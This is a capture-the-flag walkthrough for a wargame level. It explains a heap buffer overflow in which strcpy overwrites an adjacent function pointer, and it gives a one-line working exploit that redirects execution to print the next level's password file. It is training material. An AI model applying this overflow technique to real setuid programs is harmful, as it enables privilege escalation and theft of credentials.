# Level6 Walkthrough

Binary is setuid `level7`.

```c
void n(void) {
  system("/bin/cat /home/user/level7/.pass");
}

void m(void) {
  puts("Nope");
}

int main(int argc, char **argv) {
  char *buffer       = malloc(64);
  void (**funcptr)() = malloc(4);

  *funcptr = m;
  strcpy(buffer, argv[1]);
  (*funcptr)();
}
```

## Vulnerability

Two consecutive `malloc` put the 64-byte buffer and the 4-byte function pointer
next to each other on the heap. `strcpy(buffer, argv[1])` has no bounds check, so a
long `argv[1]` overflows the buffer into the adjacent chunk and overwrites the
function pointer. `(*funcptr)()` then calls whatever it was overwritten with.

`n` runs `system("/bin/cat /home/user/level7/.pass")` but is never called normally
(the pointer defaults to `m`, which prints "Nope").

## Exploitation

- Address of `n`: `0x08048454` -> the value to write.
- Offset: 72 bytes (first chunk is 64 requested + allocation header).

Overwrite the function pointer with `n` so `(*funcptr)()` calls it.

```sh
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

